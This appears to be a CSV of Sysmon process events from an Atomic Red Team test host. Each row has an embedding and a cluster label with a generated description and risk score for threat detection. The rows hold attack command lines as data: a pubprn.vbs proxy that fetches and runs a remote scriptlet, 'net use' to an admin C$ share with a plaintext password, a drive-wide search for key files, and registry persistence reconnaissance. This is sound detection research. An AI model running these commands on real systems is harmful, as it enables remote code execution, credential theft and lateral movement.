Timestamp,Computer,Provider,EventID,CommandLine,Embedding,Cluster_DBSCAN,Cluster_KMeans,DBSCANClusterDescription,DBSCANClusterRiskScore
2019-07-19T14:48:36.882586Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cscript.exe  /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost  script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct,"[ 0.01707721 -0.00463136 -0.00908924 ... -0.01084674 -0.01502553
 -0.00700739]",14,22,"This cluster contains multiple executions of the `cscript.exe` command using the VBScript located in the Printing Admin Scripts folder. The scripts are pulling scripts from external URLs, indicating possible malicious activity, especially since they use localhost and include remote payloads.",8
2019-07-19T14:48:41.050661Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""cmd.exe /c "" net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator","[-0.01294345 -0.01370199  0.00546838 ...  0.0146743   0.00728888
 -0.03290685]",15,53,"This cluster involves commands that establish a network connection to a remote Windows share (C$) using administrative credentials, indicating potential unauthorized access attempts or lateral movement within a network.",9
2019-07-19T14:48:41.085108Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd.exe  /c  net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator,"[-0.01155709 -0.02046802  0.00574547 ...  0.00889108  0.00441908
 -0.02730833]",15,53,"This cluster involves commands that establish a network connection to a remote Windows share (C$) using administrative credentials, indicating potential unauthorized access attempts or lateral movement within a network.",9
2019-07-19T14:48:41.109076Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,net  use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator,"[ 0.00150183 -0.0142427   0.00573317 ...  0.00677084  0.00353812
 -0.03345508]",15,53,"This cluster involves commands that establish a network connection to a remote Windows share (C$) using administrative credentials, indicating potential unauthorized access attempts or lateral movement within a network.",9
2019-07-19T14:48:57.466584Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""echo "" ""ATOMICREDTEAM > %%windir%%\cert.key""","[-0.0090586  -0.02320175 -0.00511598 ...  0.00755698  0.01530952
  0.00108344]",-1,116,Unclustered commands,0
2019-07-19T14:48:57.524876Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""dir c:\ /b /s .key | findstr /e .key""","[-0.01705071  0.01872048  0.00084592 ...  0.00551501 -0.0149601
 -0.00635668]",16,100,"This cluster contains commands that search for files with the '.key' extension across the entire C: drive. This indicates an attempt to locate sensitive or potentially malicious key files, which can be associated with unauthorized access or data exfiltration.",7
2019-07-19T14:48:57.557947Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\cmd.exe  /S /D /c"" dir c:\ /b /s .key ""","[-0.00718201  0.02905634  0.00742141 ...  0.01293445 -0.00699391
 -0.00774973]",16,100,"This cluster contains commands that search for files with the '.key' extension across the entire C: drive. This indicates an attempt to locate sensitive or potentially malicious key files, which can be associated with unauthorized access or data exfiltration.",7
2019-07-19T14:48:57.570057Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,findstr  /e .key,"[ 0.01381068  0.02049652  0.00966532 ...  0.00785892 -0.00865057
 -0.00437926]",-1,109,Unclustered commands,0
2019-07-19T14:49:32.150327Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows","[-0.02667083  0.00036934  0.00585696 ...  0.00601771  0.00956823
 -0.01050479]",193,21,"Commands querying critical Windows registry keys, indicating potential reconnaissance activity or configuration analysis.",6
2019-07-19T14:49:32.180586Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows,"[-0.00972381  0.00944219 -0.00084536 ... -0.00172787  0.01874357
 -0.00208675]",193,21,"Commands querying critical Windows registry keys, indicating potential reconnaissance activity or configuration analysis.",6
2019-07-19T14:49:32.227372Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""","[-0.01495381  0.01791094 -0.00357728 ... -0.00061315 -0.00295187
 -0.00810757]",17,115,"This cluster includes multiple commands that query various Windows registry keys related to startup processes, including Run, RunOnce, and RunServices across both local machine and current user contexts.",3
2019-07-19T14:49:32.249442Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,"[ 8.84690695e-03  1.62093323e-02  9.76158679e-03 ... -7.96010718e-05
  9.70910490e-03 -7.67356716e-03]",18,7,"Commands related to querying registry keys for persistent startup entries, indicating potential investigation of persistence mechanisms used by software or malware.",6
2019-07-19T14:49:32.304938Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""","[-0.01886453  0.01523997 -0.00366655 ... -0.00372253 -0.00565026
 -0.00822174]",17,115,"This cluster includes multiple commands that query various Windows registry keys related to startup processes, including Run, RunOnce, and RunServices across both local machine and current user contexts.",3
2019-07-19T14:49:32.335446Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,"[ 0.00523713  0.01242837  0.00873729 ... -0.00230599  0.0052259
 -0.00712759]",18,7,"Commands related to querying registry keys for persistent startup entries, indicating potential investigation of persistence mechanisms used by software or malware.",6
2019-07-19T14:49:32.389557Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices""","[-0.00673548  0.0100613  -0.0009546  ...  0.00372757 -0.00334154
 -0.01510593]",17,115,"This cluster includes multiple commands that query various Windows registry keys related to startup processes, including Run, RunOnce, and RunServices across both local machine and current user contexts.",3
2019-07-19T14:49:32.413390Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices,"[ 0.01362696  0.01195946  0.00883387 ... -0.00049734  0.01625618
 -0.00822891]",19,128,"Commands querying the Windows registry for startup applications, both system-wide and user-specific, indicating potential monitoring or recon activities related to system behavior or persistence mechanisms.",5
2019-07-19T14:49:32.463556Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices""","[-0.01231221  0.00770565 -0.00232782 ...  0.00235587 -0.00363547
 -0.01601429]",17,115,"This cluster includes multiple commands that query various Windows registry keys related to startup processes, including Run, RunOnce, and RunServices across both local machine and current user contexts.",3
2019-07-19T14:49:32.497481Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices,"[ 0.01252759  0.01018901  0.00919642 ... -0.00179248  0.01179819
 -0.0112643 ]",19,128,"Commands querying the Windows registry for startup applications, both system-wide and user-specific, indicating potential monitoring or recon activities related to system behavior or persistence mechanisms.",5
2019-07-19T14:49:32.551678Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""","[-0.01081654 -0.01842292 -0.00813194 ... -0.00481524  0.01487186
 -0.03247093]",193,21,"Commands querying critical Windows registry keys, indicating potential reconnaissance activity or configuration analysis.",6
2019-07-19T14:49:32.585243Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify,"[ 0.0203874  -0.01607888  0.00269673 ... -0.01106009  0.03081525
 -0.02388416]",219,128,"This cluster involves querying the Windows Registry for specific keys related to logon notifications and shell service objects, which are often targeted by malware for persistence or stealth operations.",6
2019-07-19T14:49:32.660402Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""","[ 3.58799635e-03  2.05942504e-02 -9.27402361e-05 ... -1.02318292e-02
  1.67026278e-02 -2.06334274e-02]",194,36,"This cluster contains commands that query the Windows Registry, specifically the Userinit value associated with Winlogon, which is critical for user login sessions and system initialization.",3
2019-07-19T14:49:32.678107Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit,"[ 0.03213488  0.03574768  0.00816275 ... -0.012183    0.02549331
 -0.01387396]",194,93,"This cluster contains commands that query the Windows Registry, specifically the Userinit value associated with Winlogon, which is critical for user login sessions and system initialization.",3
2019-07-19T14:49:32.728253Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""","[ 0.00173929  0.00287684 -0.00094383 ... -0.00443478  0.00425673
 -0.01279327]",20,36,"This cluster consists of commands querying registry keys related to user shell configurations for both current user and local machine contexts. Such commands can be used to gather essential information about the shell environment, which might help in further attacks or system manipulations.",6
2019-07-19T14:49:32.743506Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell,"[ 0.01595871  0.00163525  0.00956838 ... -0.00816428  0.0076095
 -0.00827387]",21,36,"Commands querying Windows registry keys related to the Winlogon shell, indicating potential attempts to gather information about user shell settings.",4
2019-07-19T14:49:32.789067Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""","[ 0.00389723 -0.00066161 -0.0016913  ... -0.00506972  0.00537284
 -0.01188487]",20,36,"This cluster consists of commands querying registry keys related to user shell configurations for both current user and local machine contexts. Such commands can be used to gather essential information about the shell environment, which might help in further attacks or system manipulations.",6
2019-07-19T14:49:32.807707Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell,"[ 0.0177086   0.00215633  0.00895839 ... -0.00895839  0.00884042
 -0.00692523]",21,36,"Commands querying Windows registry keys related to the Winlogon shell, indicating potential attempts to gather information about user shell settings.",4
2019-07-19T14:49:32.850894Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad""","[-0.01918598  0.00360903 -0.00558574 ... -0.00448438  0.02475378
 -0.01190334]",193,115,"Commands querying critical Windows registry keys, indicating potential reconnaissance activity or configuration analysis.",6
2019-07-19T14:49:32.868916Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad,"[ 8.51293880e-05 -4.61725006e-03  3.55703407e-03 ... -4.81103314e-03
  3.77727598e-02  9.40499245e-04]",219,128,"This cluster involves querying the Windows Registry for specific keys related to logon notifications and shell service objects, which are often targeted by malware for persistence or stealth operations.",6
2019-07-19T14:49:32.921206Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce""","[-0.01746772  0.01356855 -0.00324752 ...  0.00263694  0.00280298
 -0.00660217]",17,115,"This cluster includes multiple commands that query various Windows registry keys related to startup processes, including Run, RunOnce, and RunServices across both local machine and current user contexts.",3
2019-07-19T14:49:32.937862Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce,"[ 0.00122175  0.01528096  0.00664306 ...  0.00058488  0.0102823
 -0.00357185]",18,7,"Commands related to querying registry keys for persistent startup entries, indicating potential investigation of persistence mechanisms used by software or malware.",6
2019-07-19T14:49:32.975133Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx""","[-0.00979516  0.01469626 -0.00562393 ...  0.00420296  0.00239943
 -0.00846234]",17,115,"This cluster includes multiple commands that query various Windows registry keys related to startup processes, including Run, RunOnce, and RunServices across both local machine and current user contexts.",3
2019-07-19T14:49:32.990533Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx,"[ 0.00697822  0.01250393  0.00197511 ... -0.00222104  0.01186605
 -0.00773522]",18,7,"Commands related to querying registry keys for persistent startup entries, indicating potential investigation of persistence mechanisms used by software or malware.",6
2019-07-19T14:49:33.036329Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run""","[-0.00228958  0.01075705 -0.00253421 ...  0.00672574  0.01021265
 -0.01418194]",17,115,"This cluster includes multiple commands that query various Windows registry keys related to startup processes, including Run, RunOnce, and RunServices across both local machine and current user contexts.",3
2019-07-19T14:49:33.059631Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKLM\Software\Microsoft\Windows\CurrentVersion\Run,"[ 0.01443207  0.01214535  0.00578494 ...  0.00522083  0.02456329
 -0.01267538]",19,128,"Commands querying the Windows registry for startup applications, both system-wide and user-specific, indicating potential monitoring or recon activities related to system behavior or persistence mechanisms.",5
2019-07-19T14:49:33.147861Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run""","[-0.00804686  0.01188066 -0.00382691 ...  0.00467848  0.00923975
 -0.01467327]",17,115,"This cluster includes multiple commands that query various Windows registry keys related to startup processes, including Run, RunOnce, and RunServices across both local machine and current user contexts.",3
2019-07-19T14:49:33.175813Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg  query HKCU\Software\Microsoft\Windows\CurrentVersion\Run,"[ 0.01080565  0.01589153  0.00680328 ...  0.00437828  0.01897254
 -0.01474905]",19,128,"Commands querying the Windows registry for startup applications, both system-wide and user-specific, indicating potential monitoring or recon activities related to system behavior or persistence mechanisms.",5
2019-07-19T14:49:33.225776Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce""","[-0.02141943  0.01233479 -0.00446    ...  0.00184163  0.00054273
 -0.0062891 ]",17,115,"This cluster includes multiple commands that query various Windows registry keys related to startup processes, including Run, RunOnce, and RunServices across both local machine and current user contexts.",3
